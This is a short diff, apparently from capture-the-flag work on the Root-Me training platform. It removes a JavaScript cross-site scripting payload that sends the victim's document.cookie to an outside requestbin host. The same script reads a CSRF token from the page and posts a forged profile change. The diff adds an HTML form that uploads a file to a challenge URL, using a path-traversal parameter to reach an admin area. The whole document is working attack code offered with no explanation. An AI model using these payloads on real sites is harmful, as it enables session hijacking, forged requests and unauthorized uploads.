@@ -1,39 +1,7 @@
-<script>
-function readBody(xhr) {
-    var data;
-    if (!xhr.responseType || xhr.responseType === "text") {
-        data = xhr.responseText;
-    } else if (xhr.responseType === "document") {
-        data = xhr.responseXML;
-    } else {
-        data = xhr.response;
-    }
-    document.write(data);
-    var parser = new DOMParser();
-    var resp = parser.parseFromString(data, "text/html");
-    token = resp.getElementsByName('token')[0].value; //grab first available token
-	csrf(token);
-    return data;
-}
-var xhr = new XMLHttpRequest();
-xhr.onreadystatechange = function () {
-    if (xhr.readyState == 4) {
-        response = readBody(xhr);
-  }
-}
-xhr.open('GET', 'http://requestbin.fullcontact.com/zsu6d8zs?c'+document.cookie, true);
-xhr.send(null);
-function csrf(token) {
-    var sendWidgetModel = {
-        "username": 'test',
-        "status": 'on',
-        "token":token
-    };
-    var x1 = new XMLHttpRequest();
-    //x1.open("POST", 'http://challenge01.root-me.org/web-client/ch23/?action=profile');
-    x1.open("POST", 'http://requestbin.fullcontact.com/zsu6d8zs');
-    
-    x1.setRequestHeader("Content-Type", "multipart/form-data");
-    x1.send(sendWidgetModel);
-}
-</script>
+
+<form method="POST" enctype="multipart/form-data" action="http://challenge01.root-me.org/realiste/ch6/index.php?sl=../adm&adm=1" >
+<input type="file" class="file" name="downloads" size="30">
+<input type="hidden" name="action" value="upload">
+<input type="hidden" name="function" value="downloads">
+<input type="submit" class="submit" value="Upload">
+</form>
